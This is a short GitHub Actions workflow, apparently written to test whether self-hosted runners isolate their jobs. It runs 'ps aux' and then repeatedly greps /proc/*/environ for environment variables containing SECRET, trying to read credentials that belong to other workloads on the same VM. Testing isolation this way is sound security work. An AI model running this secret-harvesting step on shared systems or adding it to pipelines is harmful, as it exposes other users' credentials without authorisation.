name: ARC Open
on:
  workflow_dispatch:

jobs:
  Explore-GitHub-Actions:
    runs-on: arc-runner-set-open
    steps:
    - run: |
        echo "😮 Can we find secrets from other Actions using the same VM to run their workloads?"
        ps aux
        for ((i=1; i<=100; i++)); do
          echo "🤔 Can we find any secrets with `grep -az SECRET /proc/*/environ 2>/dev/null`?"
          grep -az SECRET /proc/*/environ 2>/dev/null
          sleep 10
        done
